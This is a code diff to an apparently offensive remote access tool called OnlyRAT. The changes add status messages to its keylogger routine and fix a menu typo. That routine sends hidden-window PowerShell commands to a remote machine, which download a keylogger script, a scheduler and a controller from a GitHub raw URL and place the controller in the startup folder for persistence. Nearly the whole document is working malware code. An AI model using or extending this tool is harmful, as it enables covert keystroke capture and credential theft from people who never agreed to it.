@@ -114,15 +114,24 @@ def remote_command(address, password, command):
 # keylogger
 def keylogger(address, password, startup, working):
 
+    print("\n[*] Prepping Keylogger...")
     # web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
     schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/schedule.ps1 -OutFile {working}/SSvmVmkWmv.ps1\""
-    controller_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile {startup}/GiLqXiexKP.cmd\""
+    controller_command = f"powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile \"{startup}/GiLqXiexKP.cmd\""
+    print("[+] Keylogger Prepped")
 
     # remote comman execution
+    print("[*] Installing Keylogger...")
     remote_command(address, password, keylogger_command)
+
+    print("[*] Installing Schedueler...")
     remote_command(address, password, schedule_command)
+
+    print("[*] Installing Controller...")
     remote_command(address, password, controller_command)
+
+    print("[+] Keylogger Installed Sucessfully")
 
 # update OnlyRAT
 def update():
@@ -215,7 +224,7 @@ def cli(arguments):
                 connect(ipv4, password)
 
             # keylogger option
-            elif optioon == "1":
+            elif option == "1":
                 keylogger(ipv4, password, startup_direcory, working_direcory)
             
             # help me
